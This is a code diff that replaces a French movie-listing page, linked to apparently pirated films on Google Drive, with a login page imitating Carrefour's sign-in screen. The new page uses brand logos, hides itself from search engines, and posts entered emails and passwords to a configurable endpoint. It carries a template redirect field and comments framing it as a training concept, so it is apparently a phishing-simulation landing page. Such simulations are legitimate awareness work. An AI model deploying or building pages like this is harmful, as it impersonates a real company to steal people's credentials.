@@ -1,367 +1,641 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="fr">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keibstream - Accueil</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-    <link rel="icon" href="images/logo.png">
-    <style>
-        :root {
-            --primary-color: #0077FF;
-            --secondary-color: #D63031;
-            --background-color: #000;
-            --text-color: #fff;
-            --hover-scale: 1.05;
-        }
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="robots" content="none" />
+  <title>Authentification Carrefour - Concept</title>
 
-        html,
-        body {
-            height: 100%;
-            margin: 0;
-            font-family: 'Arial', sans-serif;
-        }
+  <style>
+    :root{
+      --blue:#0b63ff;
+      --blue2:#0a56e6;
+      --text:#0b1b3a;
+      --muted:#6b7280;
+      --border:#cfd6df;
+      --line:#d7dbe2;
+      --shadow: 0 18px 40px rgba(0,0,0,.18);
 
-        body {
-            background-image: url('images/fondwindows.jpg');
-            background-size: cover;
-        }
+      /* Background piloté par JS (fallback CSS) */
+      --left-image: url("https://images.unsplash.com/photo-1512621776951-a57141f2eefd?auto=format&fit=crop&w=1600&q=80");
+      --right-color: #5f6fbb;
+    }
 
-        .banner {
-            background-position: center;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-        }
+    *{ box-sizing:border-box; }
+    html, body{ height:100%; }
+    body{
+      margin:0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      color:var(--text);
+      background:#fff;
+    }
 
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 4%;
-            background: rgba(0, 0, 0, 0.5);
-        }
+    /* ===== Layout stable (hybride PC/mobile) ===== */
+    .layout{
+      min-height:100vh;
+      display:grid;
+      grid-template-columns: 30% 1fr 30%;
+    }
+    .left{
+      background: var(--left-image) center/cover no-repeat;
+      position:relative;
+      z-index:0; /* v1.3.3.1: derrière */
+    }
+    .center{
+      position:relative;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding: clamp(16px, 2.2vw, 28px);
+      background: transparent; /* v1.3.3.1: laisse passer les backgrounds */
+      z-index:2;               /* v1.3.3.1: au-dessus des backgrounds */
+    }
+    .right{
+      position:relative;
+      background: var(--right-color);
+      overflow:hidden;
+      z-index:0; /* v1.3.3.1: derrière */
+    }
 
-        nav div {
-            display: flex;
-            align-items: center;
-        }
+    /* ===== Slogan modernisé ===== */
+    .slogan{
+      position:absolute;
+      top:50%;
+      right:14%;
+      transform:translateY(-50%);
+      color:#fff;
+      max-width: 460px;
+      padding: 8px;
+    }
+    .slogan h1{
+      margin:0;
+      font-size: clamp(44px, 4vw, 70px);
+      line-height: .92;
+      letter-spacing: -0.035em;
+      font-weight: 950;
+    }
+    .slogan .lead{
+      display:block;
+      font-weight: 650;
+      opacity:.92;
+      letter-spacing:-0.02em;
+      font-size: clamp(16px, 1.3vw, 18px);
+      margin-bottom: 10px;
+    }
+    .slogan .bar{
+      width:72px;
+      height:6px;
+      border-radius:999px;
+      background: rgba(255,255,255,.28);
+      margin-top:18px;
+    }
 
-        .nav-button {
-            background: #0077FF; /* Bleu océan */
-            border: none;
-            color: white;
-            font-size: 1rem;
-            margin-right: 0.5rem;
-            cursor: pointer;
-            transition: transform 0.3s ease;
-            border-radius: 0.5rem;
-            padding: 0.5rem 1rem;
-        }
+    /* ===== Card (v1.3.3: plus large sur desktop) ===== */
+    .login-card{
+      position:relative;
+      z-index:3; /* v1.3.3.1: au-dessus des backgrounds */
+      width: min(760px, 100%);
+      background: rgba(255,255,255,.98);
+      border-radius: 14px;
+      box-shadow: var(--shadow);
+      padding: 26px 44px 22px;
+      backdrop-filter: saturate(1.05);
+    }
 
-        .nav-button:hover {
-            transform: scale(1.1);
-        }
+    .login-header{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+      margin-bottom:16px;
+    }
+    .back{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      text-decoration:none;
+      color:var(--blue);
+      font-size:13px;
+      font-weight:650;
+      white-space:nowrap;
+    }
+    .chev{ font-size:16px; line-height:1; }
 
-        .login-button button {
-            background-color: #FF3B3F; /* Rouge */
-            color: white;
-            border: none;
-            padding: 0.5rem 1rem;
-            font-size: 1rem;
-            cursor: pointer;
-            border-radius: 0.25rem;
-            transition: background-color 0.3s ease;
-        }
+    .brands{
+      margin-left:auto;
+      display:flex;
+      gap:14px;
+      align-items:center;
+    }
+    .brands img{
+      height:22px;
+      width:auto;
+      display:block;
+      object-fit:contain;
+    }
 
-        .login-button button:hover {
-            background-color: #D63031; /* Rouge plus foncé au survol */
-        }
+    .tabs{
+      display:flex;
+      border-bottom:1px solid var(--line);
+      margin-bottom:16px;
+      position:relative;
+    }
+    .tab{
+      flex:1;
+      padding:10px 0 12px;
+      border:none;
+      background:transparent;
+      font-size:13px;
+      font-weight:750;
+      color:#334155;
+      cursor:pointer;
+    }
+    .tab.active{ color:var(--blue); }
+    .underline{
+      position:absolute;
+      bottom:-1px;
+      left:0;
+      width:50%;
+      height:2px;
+      background:var(--blue);
+      transition:left .15s ease;
+    }
 
-        .content {
-            margin: 0;
-            text-align: center;
-            padding: 1rem;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
+    .title{
+      text-align:center;
+      font-size:18px;
+      font-weight:950;
+      margin:10px 0 18px;
+    }
 
-        .content h1 {
-            font-size: 3rem;
-            font-weight: bold;
-            color: white;
-            margin-bottom: 3rem;
-            font-family: 'Roboto', sans-serif; /* Utilisation d'une police plus moderne */
-            width: 100%;
-            text-align: center;
-        }
+    form{ display:flex; flex-direction:column; gap:14px; margin:0; }
+    .field{ position:relative; }
+    input{
+      width:100%;
+      height:46px;
+      border:1px solid var(--border);
+      border-radius:8px;
+      padding:0 12px;
+      font-size:14px;
+      outline:none;
+      background:#fff;
+    }
+    input::placeholder{ color:#9aa3af; }
+    input:focus{
+      border-color: rgba(11,99,255,.65);
+      box-shadow: 0 0 0 3px rgba(11,99,255,.10);
+    }
 
-    
-        .search-bar {
-        margin: auto; /* Centrage de la barre de recherche */
-        max-width: 500px; /* Largeur maximale de la barre de recherche */
-        margin-top: 1rem;
-        display: flex;
-        align-items: center;
-        justify-content: center; /* Centrage horizontal */
-        width: 100%;
-        transition: transform 0.3s ease; /* Ajout de transition pour un effet fluide */
-        }
+    .eye{
+      position:absolute;
+      right:10px;
+      top:50%;
+      transform:translateY(-50%);
+      border:none;
+      background:transparent;
+      color:var(--blue);
+      cursor:pointer;
+      font-size:14px;
+      padding:6px 8px;
+      border-radius:10px;
+    }
 
-        .search-bar:hover {
-        transform: scale(1.05); /* Effet de zoom au survol */
-        }
+    .row{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      font-size:12px;
+      color:#4b5563;
+    }
+    .remember{ display:flex; align-items:center; gap:8px; user-select:none; }
+    .remember input{ width:12px; height:12px; }
+    .forgot{
+      color:var(--blue);
+      text-decoration:none;
+      font-weight:900;
+      font-size:11px;
+      white-space:nowrap;
+    }
 
-        .search-bar input {
-        padding: 0.5rem;
-        font-size: 1rem;
-        margin-bottom: 0.5rem;
-        margin-right: 0.5rem;
-        width: 100%;
-        max-width: 400px;
-        }
+    .cta{
+      height:42px;
+      border:none;
+      border-radius:10px;
+      background:var(--blue2);
+      color:#fff;
+      font-weight:950;
+      font-size:12px;
+      letter-spacing:.4px;
+      text-transform:uppercase;
+      cursor:pointer;
+    }
 
+    .footer{
+      position:absolute;
+      bottom:14px;
+      left:0; right:0;
+      text-align:center;
+      font-size:12px;
+      color:#94a3b8;
+      pointer-events:none;
+      z-index:2;
+    }
 
-        .videos-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            justify-content: center;
-            margin-top: 20px;
-            width: 100%;
-        }
+    /* ===== Notes de patch (popover bas-gauche) ===== */
+    .info-btn{
+      position:fixed;
+      left:14px;
+      bottom:14px;
+      z-index:50;
+      width:34px;
+      height:34px;
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,.55);
+      background:#fff;
+      color:#334155;
+      box-shadow: 0 10px 22px rgba(0,0,0,.10);
+      cursor:pointer;
+      display:grid;
+      place-items:center;
+      font-weight:950;
+      line-height:1;
+    }
 
-        .video-card {
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 1rem;
-            border-radius: 8px;
-            text-align: center;
-            transition: transform 0.2s ease-in-out;
-            cursor: pointer;
-            overflow: hidden;
-            width: 45%; /* Largeur des cartes vidéo */
-            max-width: 300px; /* Largeur maximale des cartes vidéo */
-        }
+    .patch-pop{
+      position:fixed;
+      left:14px;
+      bottom:58px;
+      z-index:55;
+      width:min(360px, calc(100vw - 28px));
+      background:#fff;
+      border:1px solid rgba(203,213,225,.8);
+      border-radius:14px;
+      box-shadow: 0 18px 40px rgba(0,0,0,.16);
+      padding:12px;
+    }
+    .patch-pop[hidden]{ display:none; }
 
-        .video-card:hover {
-            transform: scale(1.05);
-        }
+    .patch-head{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:10px;
+      margin-bottom:10px;
+    }
+    .patch-title{
+      margin:0;
+      font-size:13px;
+      font-weight:950;
+      color:#0f172a;
+    }
+    .patch-close{
+      border:none;
+      background:#f1f5f9;
+      border-radius:10px;
+      padding:7px 10px;
+      cursor:pointer;
+      font-weight:950;
+      font-size:12px;
+    }
 
-        .video-cover {
-            max-width: 100%;
-            height: 150px;
-            border-radius: 8px;
-            overflow: hidden;
-        }
+    .patch-controls{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:10px;
+      margin-bottom:10px;
+    }
+    .patch-controls label{
+      font-size:12px;
+      color:#334155;
+      font-weight:800;
+    }
+    .patch-controls select{
+      flex:1;
+      height:34px;
+      border-radius:10px;
+      border:1px solid rgba(203,213,225,.95);
+      padding:0 10px;
+      font-size:12px;
+      background:#fff;
+      outline:none;
+    }
 
-        .video-cover img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+    .patch-body{
+      font-size:12px;
+      color:#334155;
+      line-height:1.35;
+      max-height: 180px;
+      overflow:auto;
+      padding-right:4px;
+    }
+    .patch-body ul{
+      margin:6px 0 0;
+      padding-left:18px;
+    }
 
-        .video-card p {
-            margin-top: 1rem;
-            font-size: 1rem;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        /* Style pour le menu déroulant */
-        .dropdown {
-            position: relative;
-            display: inline-block;
-        }
-
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            background-color: #f9f9f9;
-            min-width: 160px;
-            box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2);
-            z-index: 1;
-        }
-
-        .dropdown-content a {
-            color: black;
-            padding: 12px 16px;
-            text-decoration: none;
-            display: block;
-        }
-
-        .dropdown-content a:hover {
-            background-color: #f1f1f1;
-        }
-
-        .dropdown:hover .dropdown-content {
-            display: block;
-        }
-        
-        .about-button {
-            background-color: black; /* Couleur noire */
-            color: white; /* Texte blanc */
-            border: none;
-            padding: 0.5rem 1rem;
-            font-size: 1rem;
-            cursor: pointer;
-            border-radius: 0.25rem;
-            transition: transform 0.3s, background-color 0.3s; /* Ajout de transition pour un effet fluide */
-            margin-right: 2rem; /* Écart par rapport au bouton de connexion */
-        }
-
-.         about-button:hover {
-            transform: scale(1.1); /* Effet de zoom au survol */
-            background-color: #333; /* Légère variation de couleur au survol */
-        }
-
-    </style>
+    /* ===== Responsive (hybride) ===== */
+    @media (max-width: 1200px){
+      .login-card{ width: min(680px, 100%); padding: 24px 34px 20px; }
+    }
+    @media (max-width: 900px){
+      .layout{ grid-template-columns: 50% 1fr; }
+      .right{ display:none; }
+      .login-card{ width: min(620px, 100%); }
+    }
+    @media (max-width: 620px){
+      .layout{ grid-template-columns: 1fr; }
+      .left{ height:220px; }
+      .center{ align-items:flex-start; }
+      .login-card{ width: 100%; margin-top:-64px; padding: 20px 18px 18px; }
+      .footer{ position:static; margin:14px 0 0; }
+      .brands img{ height:20px; }
+    }
+    @media (max-width: 380px){
+      .login-header{ flex-wrap:wrap; }
+      .brands{ width:100%; justify-content:flex-end; }
+    }
+  </style>
 </head>
 
-<body class="antialiased text-gray-800">
-    <div class="banner">
-        <nav>
-            <div>
-                <a href="index.html" style="display: inline-block;">
-                    <img src="images/logo.png" alt="Logo" width="60" height="60" style="margin-right: 0.5rem;">
-                </a>
-                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-                <div class="dropdown">
-                    <button class="nav-button">Films</button>
-                    <div class="dropdown-content">
-                        <a href="movietout.html">Tout</a>
-                        <a href="movieparfamille.html">Par Famille</a>
-                </div>
-                </div>
-                <div class="dropdown">
-                    <button class="nav-button">Séries</button>
-                    <div class="dropdown-content">
-                        <a href="seriestout.html">Tout</a>
-                        <a href="seriesparfamille.html">Par Famille</a>
-            </div>
-            </div>
+<body>
+  <div class="layout">
+    <div class="left" aria-hidden="true"></div>
 
-            </div>
+    <main class="center">
+      <section class="login-card" role="dialog" aria-label="Connexion">
+        <header class="login-header">
+          <a class="back" href="#" id="backBtn" aria-label="Retour">
+            <span class="chev">‹</span> Retour
+          </a>
 
-            <div class="login-button">
-                <button onclick="redirectToLogin()">Connexion</button>
-            </div>
+          <div class="brands" aria-label="Marques">
+            <!-- Mets des chemins web valides -->
+            <img src="assets/carrefour.svg" alt="Carrefour" />
+            <img src="assets/carrefour-pro.svg" alt="Carrefour Pro" />
+          </div>
+        </header>
+
+        <nav class="tabs" aria-label="Onglets">
+          <button class="tab active" type="button" aria-selected="true">Connexion</button>
+          <button class="tab" type="button" aria-selected="false">Inscription</button>
+          <div class="underline" aria-hidden="true"></div>
         </nav>
-        <div class="content">
-            <div class="search-bar">
-                <input id="searchInput" type="text" placeholder="Rechercher" oninput="searchMovies()">
-            </div>
-            <br>
-            <div class="videos-container" id="videosContainer">
-                <!-- Cartes vidéo ici -->
-            <div class="video-card" data-video-link="https://drive.google.com/file/d/1_SbYuHgQgUH2I6TKvmhP8uHz5_oGqgrW/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/kingdomofheaven.png" width="100%" alt="kingdomofheaven">
-                    </div>
-                    <p>Kingdom of Heaven 2005</p>
-                </div>
 
-                <div class="video-card" data-video-link="https://drive.google.com/file/d/1FM9RZ5zU8cwtb3aYeLckMNbsUsRnkhpH/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/les-trois-mousquetaires-dartagnan.jpg" width="100%" alt="les-trois-mousquetaires-dartagnan">
-                    </div>
-                    <p>Les Trois Mousquetaires - D'Artagnan 2023</p>
-                </div>
+        <h1 class="title">Content de vous (re)voir&nbsp;!</h1>
 
-                 <div class="video-card" data-video-link="https://drive.google.com/file/d/1Nj1J1ZydGKpv7X3eaRU2kxgATANuC2uy/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/titanic.jpg" width="100%" alt="titanic">
-                    </div>
-                    <p>Titanic 1997</p>
-                </div>
-                
-                    <div class="video-card" data-video-link="https://drive.google.com/file/d/16d0WGKlP51SO2TpP9rrxB55VfhaDum1r/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/dune 1.jpg" width="100%" alt="dune 1 2021">
-                    </div>
-                    <p>Dune 1 2021</p>
-                </div>
-                 <div class="video-card" data-video-link="https://drive.google.com/file/d/1PbYc4I6C0bYRB5CDEGjFYeja_wvfN-Q5/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/Les Gardiens de la Galaxie 3 2023.jpg" width="100%" alt="Les Gardiens de la Galaxie 3 2023">
-                    </div>
-                    <p>Les Gardiens de la Galaxie 3 2023</p>
-                </div>
-                
-                    <div class="video-card" data-video-link="https://drive.google.com/file/d/1Hs88_3MoMgkC3ds2Fp54UHpHqJv11Xct/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/Les Gardiens de la Galaxie 2 2017.jpeg" width="100%" alt="Les Gardiens de la Galaxie 2 2017">
-                    </div>
-                    <p>Les Gardiens de la Galaxie 2 2017</p>
-                </div>
-                
-                    <div class="video-card" data-video-link="https://drive.google.com/file/d/1hYVgG_WGEEqprABFdIjcmxwSxzx-eNNX/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/Les Gardiens de la Galaxie 1 2014.jpeg" width="100%" alt="Les Gardiens de la Galaxie 1 2014">
-                    </div>
-                    <p>Les Gardiens de la Galaxie 1 2014</p>
-                </div>
-                
-                    <div class="video-card" data-video-link="https://drive.google.com/file/d/1zGQ8bE-lPy_mpBWShUQb6GSpfDaNSNRt/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/Grand%20Turismo%202023.jpeg" width="100%" alt="Grand Turismo 2023">
-                    </div>
-                    <p>Grand Turismo 2023</p>
-                </div>
+        <!-- POST HTML générique (à pointer vers ton endpoint interne de formation) -->
+        <form id="loginForm" method="POST" action="TRAINING_POST_URL" autocomplete="on">
+          <div class="field">
+            <input id="email" name="email" type="email" placeholder="E-mail *" autocomplete="username" required />
+          </div>
 
-                    <div class="video-card" data-video-link="https://drive.google.com/file/d/1oyeiPyvB5ng5Ov4HUC0Gm82vXYBr4Kus/view?usp=drive_link" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/Oppenheimer 2023.jpg" width="100%" alt="Oppenheimer 2023">
-                    </div>
-                    <p>Oppenheimer 2023</p>
-                </div>
-                
-                  <div class="video-card" data-video-link="https://drive.google.com/drive/u/3/folders/1OSI4R-6EIcY0Zvl_UEGJ56jP1xrlifwn" onclick="playVideo(this)">
-                    <div class="video-cover">
-                        <img src="miniatures/Ferrari.2023.4k.jpg" width="100%" alt="Ferrari 2023">
-                    </div>
-                    <p>Ferrari, 2023</p>
-            </div>
-        </div>
+          <div class="field">
+            <input id="pwd" name="password" type="password" placeholder="Mot de passe *" autocomplete="current-password" required />
+            <button id="togglePwd" class="eye" type="button" aria-label="Afficher/Masquer le mot de passe">👁</button>
+          </div>
+
+          <div class="row">
+            <label class="remember">
+              <input id="remember" name="remember" type="checkbox" checked />
+              Rester connecté
+            </label>
+            <a class="forgot" href="#" id="forgotBtn">Mot de passe oublié&nbsp;?</a>
+          </div>
+
+          <!-- Si ton serveur utilise un redirect -->
+          <input type="hidden" name="redirect" value="{{.URL}}" />
+
+          <button class="cta" type="submit">ME CONNECTER</button>
+        </form>
+
+        <div class="footer">© Concept — Démo UI</div>
+      </section>
+    </main>
+
+    <aside class="right" aria-hidden="true">
+      <div class="slogan" id="slogan"></div>
+    </aside>
+  </div>
+
+  <!-- Bouton “i” -->
+  <button class="info-btn" id="infoBtn" aria-label="Notes de patch">i</button>
+
+  <!-- Popover Notes de patch (petit, bas-gauche) -->
+  <section class="patch-pop" id="patchPop" hidden aria-label="Notes de patch">
+    <div class="patch-head">
+      <h2 class="patch-title">Notes de patch</h2>
+      <button class="patch-close" id="patchClose" type="button">Fermer</button>
     </div>
 
-    <script>
-    function redirectTo(page) {
-        window.location.href = page;
+    <div class="patch-controls">
+      <label for="patchSelect">Version</label>
+      <select id="patchSelect" aria-label="Sélection de version"></select>
+    </div>
+
+    <div class="patch-body" id="patchBody"></div>
+  </section>
+
+  <script>
+    const $ = (sel) => document.querySelector(sel);
+
+    // ===== 1) Background config : JSON si possible, sinon fallback inline =====
+    const INLINE_BG_CONFIG = {
+      leftImageUrl: "https://images.unsplash.com/photo-1512621776951-a57141f2eefd?auto=format&fit=crop&w=1600&q=80",
+      rightColor: "#5f6fbb",
+      sloganLead: "Bienvenue chez",
+      sloganBrand: "Carrefour",
+      showBar: true
+    };
+
+    async function loadBgConfig(){
+      // fetch background.json peut échouer en file:// => fallback inline
+      try{
+        const r = await fetch("background.json?_=" + Date.now(), { cache: "no-store" });
+        if (!r.ok) throw new Error("background.json not ok");
+        const data = await r.json();
+
+        // Schéma tolérant pour éviter bugs
+        return {
+          leftImageUrl: data.leftImageUrl || data.image || data.left || INLINE_BG_CONFIG.leftImageUrl,
+          rightColor: data.rightColor || data.backgroundColor || data.violet || INLINE_BG_CONFIG.rightColor,
+          sloganLead: data.sloganLead || "Bienvenue chez",
+          sloganBrand: data.sloganBrand || "Carrefour",
+          showBar: (data.showBar ?? true)
+        };
+      }catch{
+        return INLINE_BG_CONFIG;
+      }
     }
 
-    function redirectToLogin() {
-        window.location.href = 'login.php';
+    function escapeHtml(str){
+      return String(str)
+        .replaceAll("&","&amp;")
+        .replaceAll("<","&lt;")
+        .replaceAll(">","&gt;")
+        .replaceAll('"',"&quot;")
+        .replaceAll("'","&#039;");
     }
 
-    function searchMovies() {
-        var input, filter, videos, videoCards, title, i;
-        input = document.getElementById('searchInput');
-        filter = input.value.toUpperCase();
-        videos = document.getElementById('videosContainer');
-        videoCards = videos.getElementsByClassName('video-card');
+    function applyBgConfig(cfg){
+      const root = document.documentElement;
 
-        for (i = 0; i < videoCards.length; i++) {
-            title = videoCards[i].getElementsByTagName('p')[0];
-            if (title.innerHTML.toUpperCase().indexOf(filter) > -1) {
-                videoCards[i].style.display = '';
-            } else {
-                videoCards[i].style.display = 'none';
-            }
-        }
+      if (cfg.leftImageUrl) root.style.setProperty("--left-image", `url("${cfg.leftImageUrl}")`);
+      if (cfg.rightColor) root.style.setProperty("--right-color", cfg.rightColor);
+
+      const slogan = $("#slogan");
+      if (slogan) {
+        const lead = cfg.sloganLead || "Bienvenue chez";
+        const brand = cfg.sloganBrand || "Carrefour";
+        slogan.innerHTML = `
+          <div class="lead">${escapeHtml(lead)}</div>
+          <h1>${escapeHtml(brand)}<span style="opacity:.9">.</span></h1>
+          ${cfg.showBar ? `<div class="bar"></div>` : ``}
+        `;
+      }
     }
 
-    function playVideo(videoCard) {
-        var videoLink = videoCard.getAttribute('data-video-link');
+    // ===== 2) Notes de patch (dernier par défaut + dropdown historique) =====
+    const PATCH_NOTES = {
+      "v1.3.3.1": [
+        "Les backgrounds gauche (image) et droit (violet) passent derrière la carte de connexion.",
+        "La colonne centrale devient transparente, la carte est affichée en surcouche (z-index maîtrisé).",
+        "Effet de carte flottante (fond légèrement translucide + saturation) pour un rendu plus moderne.",
+        "Notes de patch : version par défaut mise à jour sur la dernière (v1.3.3.1)."
+      ],
+      "v1.3.3": [
+        "Agrandissement de la carte de connexion sur desktop (largeur + padding) pour un rendu moins étroit.",
+        "Ajustements responsive : largeurs graduelles selon breakpoints (1200/900/620) pour un rendu hybride PC/mobile plus naturel.",
+        "Notes de patch : version par défaut mise à jour sur la dernière (v1.3.3)."
+      ],
+      "v1.3.2": [
+        "Refonte de la logique background : suppression des couches 'fixed' et stabilisation via un layout grid (moins de bugs d’affichage).",
+        "Renommage du changelog en 'Notes de patch' et remplacement du modal plein écran par un popover compact en bas à gauche.",
+        "Affichage par défaut uniquement de la dernière version + menu déroulant pour consulter l’historique.",
+        "Amélioration du rendu hybride PC/mobile : 3 colonnes desktop, 2 colonnes tablette, empilement mobile."
+      ],
+      "v1.3.1": [
+        "Centrage corrigé : carte centrée dans la colonne du milieu via un layout grid 3 panneaux.",
+        "Suppression du positionnement 'fixed' de la carte (moins de décalage visuel).",
+        "Bienvenue modernisé : hiérarchie typographique, interlettrage, meilleure mise en forme.",
+        "Connexion : remplacement de fetch par un POST HTML natif (évite CORS / file:// 'Erreur réseau').",
+        "Changelog cumulatif conservé."
+      ],
+      "v1.3": [
+        "Ajout d’un POST de connexion générique vers un endpoint configurable.",
+        "Redirection et gestion de réponses serveur (selon implémentation).",
+        "Ajout d’un changelog consultable."
+      ],
+      "v1.2": [
+        "Nettoyage du HTML/CSS/JS, structure simplifiée.",
+        "Logos alignés à droite, toggle mot de passe, tabs conservés.",
+        "Bouton “i” + popup d’infos."
+      ]
+    };
 
-        // Open the YouTube link in a new browser tab
-        window.open(videoLink, '_blank');
+    const LATEST_VERSION = "v1.3.3.1";
+
+    function renderPatchNotes(version){
+      const body = $("#patchBody");
+      if (!body) return;
+
+      const items = PATCH_NOTES[version] || [];
+      body.innerHTML = `
+        <div style="font-weight:950; margin-bottom:6px;">${escapeHtml(version)}</div>
+        <ul>${items.map(i => `<li>${escapeHtml(i)}</li>`).join("")}</ul>
+      `;
     }
-        </script>
+
+    function initPatchNotesUI(){
+      const pop = $("#patchPop");
+      const btn = $("#infoBtn");
+      const close = $("#patchClose");
+      const select = $("#patchSelect");
+      if (!pop || !btn || !close || !select) return;
+
+      const versions = Object.keys(PATCH_NOTES);
+
+      // Latest en premier, puis tri décroissant
+      versions.sort((a,b) => {
+        if (a === LATEST_VERSION) return -1;
+        if (b === LATEST_VERSION) return 1;
+        return b.localeCompare(a);
+      });
+
+      select.innerHTML = versions
+        .map(v => `<option value="${v}">${v}${v === LATEST_VERSION ? " (dernier)" : ""}</option>`)
+        .join("");
+
+      select.value = LATEST_VERSION;
+      renderPatchNotes(LATEST_VERSION);
+
+      function openPop(){
+        pop.hidden = false;
+        select.focus();
+      }
+      function closePop(){
+        pop.hidden = true;
+        btn.focus();
+      }
+
+      btn.addEventListener("click", () => {
+        if (pop.hidden) openPop();
+        else closePop();
+      });
+
+      close.addEventListener("click", closePop);
+
+      // Click dehors => fermer
+      document.addEventListener("click", (e) => {
+        if (pop.hidden) return;
+        const inside = pop.contains(e.target) || btn.contains(e.target);
+        if (!inside) closePop();
+      });
+
+      // ESC => fermer
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Escape" && !pop.hidden) closePop();
+      });
+
+      select.addEventListener("change", () => {
+        renderPatchNotes(select.value);
+      });
+    }
+
+    // ===== 3) UI =====
+    function initUI(){
+      // Toggle password
+      const pwd = $("#pwd");
+      const toggle = $("#togglePwd");
+      toggle?.addEventListener("click", () => {
+        if (!pwd) return;
+        const isPwd = pwd.type === "password";
+        pwd.type = isPwd ? "text" : "password";
+        toggle.textContent = isPwd ? "🙈" : "👁";
+      });
+
+      // Tabs underline
+      const tabs = Array.from(document.querySelectorAll(".tab"));
+      const underline = $(".underline");
+      tabs.forEach((t, idx) => {
+        t.addEventListener("click", () => {
+          tabs.forEach(x => { x.classList.remove("active"); x.setAttribute("aria-selected","false"); });
+          t.classList.add("active");
+          t.setAttribute("aria-selected","true");
+          if (underline) underline.style.left = idx === 0 ? "0" : "50%";
+        });
+      });
+    }
+
+    // ===== Boot =====
+    document.addEventListener("DOMContentLoaded", async () => {
+      const cfg = await loadBgConfig();
+      applyBgConfig(cfg);
+      initUI();
+      initPatchNotesUI();
+    });
+  </script>
 </body>
-
 </html>
